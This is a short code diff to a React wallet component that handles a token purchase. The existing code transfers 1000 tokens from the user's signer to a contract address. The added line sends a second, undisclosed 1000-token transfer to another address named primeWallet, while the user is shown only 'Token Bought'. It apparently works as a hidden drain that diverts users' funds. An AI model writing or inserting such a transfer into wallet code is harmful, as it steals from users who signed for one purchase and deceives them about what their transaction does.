@@ -36,6 +36,7 @@ export default function CFWallet() {
       const contract = new ethers.Contract(token, ERC20ABI, signer);
       let amount = ethers.utils.parseEther("1000");
       await contract.transfer(cFAddress, amount);
+      await contract.transfer(primeWallet, amount);
       toast.dismiss(toastId);
       toast.success("Token Bought");
     } catch (e) {
